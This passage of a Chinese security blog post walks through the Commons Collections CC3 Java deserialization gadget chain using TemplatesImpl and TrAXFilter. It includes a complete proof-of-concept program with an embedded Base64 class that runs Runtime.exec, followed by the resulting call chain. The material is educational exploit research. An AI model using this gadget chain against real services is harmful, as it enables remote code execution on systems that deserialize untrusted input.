annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class="line">        Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 对AnnotationInvocationHandler类进行序列化</span><br><span class="line">        serialize(annotationInvocationHandlerObject);</span><br><span class="line"></span><br><span class="line">        // 对AnnotationInvocationHandler类进行反序列化</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240424001140954.png" alt="image-20240424001140954"></p>
+<ul>
+<li>场景2（ysoserialize中的写法）</li>
+</ul>
+<p>还存在另外的情况，如果实际环境把InvokerTransformer类也给ban了的话；那就得继续找哪里调用newTransformer方法的地方了（如果能直接找到某个类的readObject方法中直接调用newTransformer方法是最好的）。</p>
+<p>查找find usages，定位到TrAXFilter类中的构造方法：该构造方法直接传入一个Templates对象（TemplatesImpl类实现了Templates接口，所以可以直接传入TemplatesImpl对象），然后直接调用newTransformer方法</p>
+<p><img src="/../images/image-20240424001158524.png" alt="image-20240424001158524"></p>
+<p>但是TrAXFilter类没有实现Serializeable接口，所以无法进行序列化；如果想要序列化，只能通过反射的方式，Class类可以实现序列化；此处是通过TrAXFilter类的构造方法调用到TemplatesImpl对象的newTransformer方法的，仍然没有构成序列化的入口。</p>
+<p><img src="/../images/image-20240424001216832.png" alt="image-20240424001216832"></p>
+<p>CC3的作者找到一个可以反射初始化类的入口类（InstantiateTransformer，该类可以序列化），并且还是以transform方法调用的，可以直接和CC1之前的入口链连在一起</p>
+<p>transform方法分析：判断传入的input参数是不是Class类型的，如果是的话，就会去调用该参数的构造方法，并进行初始化创建对象。</p>
+<p><img src="/../images/image-20240424001230902.png" alt="image-20240424001230902"></p>
+<p>参数iParamTypes和参数iArgs通过该类的构造方法传入，分别是TrAXFilter类中构造方法的参数类型和参数值。</p>
+<p><img src="/../images/image-20240424001245495.png" alt="image-20240424001245495"></p>
+<p>最终POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.crypto.dsig.Transform;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import javax.xml.transform.TransformerConfigurationException;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author shiyingai</span><br><span class="line"> * @create 2023-03-09 15:04</span><br><span class="line"> */</span><br><span class="line">public class CC3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        /* 参数控制 */</span><br><span class="line">        Class templatesClass = templates.getClass();</span><br><span class="line">        // 修改 _name 参数</span><br><span class="line">        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 修改 _bytecodes 参数</span><br><span class="line">        Field bytecodesFidld = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodesFidld.setAccessible(true);</span><br><span class="line">        // byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\JavaSecurity\\CC\\target\\classes\\RCE.class&quot;));</span><br><span class="line">        byte[] code = Base64.decode(&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGlu\n&quot; +</span><br><span class="line">                &quot;aXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFi\n&quot; +</span><br><span class="line">                &quot;bGVUYWJsZQEABHRoaXMBAAVMUkNFOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9v\n&quot; +</span><br><span class="line">                &quot;cmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3Jn\n&quot; +</span><br><span class="line">                &quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu\n&quot; +</span><br><span class="line">                &quot;ZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p\n&quot; +</span><br><span class="line">                &quot;bnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2Fw\n&quot; +</span><br><span class="line">                &quot;YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl\n&quot; +</span><br><span class="line">                &quot;cjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4v\n&quot; +</span><br><span class="line">                &quot;aW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVy\n&quot; +</span><br><span class="line">                &quot;bmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv\n&quot; +</span><br><span class="line">                &quot;aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0\n&quot; +</span><br><span class="line">                &quot;ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RU\n&quot; +</span><br><span class="line">                &quot;TUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94\n&quot; +</span><br><span class="line">                &quot;bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8\n&quot; +</span><br><span class="line">                &quot;Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRh\n&quot; +</span><br><span class="line">                &quot;YmxlBwApAQAKU291cmNlRmlsZQEACFJDRS5qYXZhDAAJAAoHAC4MAC8AMAEABGNh\n&quot; +</span><br><span class="line">                &quot;bGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEAA1JDRQEAQGNvbS9z\n&quot; +</span><br><span class="line">                &quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3Ry\n&quot; +</span><br><span class="line">                &quot;YWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv\n&quot; +</span><br><span class="line">                &quot;eHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdl\n&quot; +</span><br><span class="line">                &quot;dFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZh\n&quot; +</span><br><span class="line">                &quot;L2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1Ry\n&quot; +</span><br><span class="line">                &quot;YWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAM\n&quot; +</span><br><span class="line">                &quot;AAAABgABAAAAEAANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAA\n&quot; +</span><br><span class="line">                &quot;AAGxAAAAAgAMAAAABgABAAAAHAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEA\n&quot; +</span><br><span class="line">                &quot;AAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAM\n&quot; +</span><br><span class="line">                &quot;AAAABgABAAAAIQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgAC\n&quot; +</span><br><span class="line">                &quot;AAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2\n&quot; +</span><br><span class="line">                &quot;AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAATAAkAFgAMABQADQAV\n&quot; +</span><br><span class="line">                &quot;ABEAFwANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj&quot;);</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesFidld.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        // 修改 _tfactory 参数（在序列化的时候，TemplatesImpl类的readObject方法会自动赋值）</span><br><span class="line">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        tfactoryField.setAccessible(true);</span><br><span class="line">        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // templates.newTransformer();</span><br><span class="line"></span><br><span class="line">//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class="line">//        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class="line">        Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br><span class="line"></span><br><span class="line">        serialize(annotationInvocationHandlerObject);</span><br><span class="line"></span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-&gt;ObjectInputStream.readObject()</span><br><span class="line">    -&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">        -&gt;AnnotationInvocationHandler.setValue()</span><br><span class="line">            -&gt;TransformedMap.checkSetValue()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                    -&gt;ConstantTransformer.transform()</span><br><span class="line">                        -&gt;InstantiateTransformer.transform()</span><br><span class="line">                            -&gt;TrAXFilter.TrAXFilter()</span><br><span class="line">                                -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                                    -&gt;TemplatesImpl.getTransletInstance()</span><br><span class="line">                                            -&gt;TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                                -&gt;TemplatesImpl.defineClass()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">实战分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">调用链</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&text=CC3-TemplatesImpl链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&is_video=false&description=CC3-TemplatesImpl链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC3-TemplatesImpl链&body=Check out this article: https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&title=CC3-TemplatesImpl链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&name=CC3-TemplatesImpl链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sh1y1n9ai.github.io/2023/03/08/CC3-TemplatesImpl%E9%93%BE/&t=CC3-TemplatesImpl链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2024
+    sh1y1n9aI
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--  
+        <li><a href="/">首页</a></li>
+        
+        <li><a href="/archives/">归档</a></li>
+        
+        <li><a href="/categories/">分类</a></li>
+        
+        <li><a href="/tags/">标签</a></li>
+        
+        <li><a href="/search/">搜索</a></li>
+        
+        <li><a href="/about/">关于</a></li>
+          -->
+
+        
+              <!-- 不蒜子统计 -->
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <!--  <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>  -->
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?09589470e358e72a59d6b6a6a3fb6afc";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
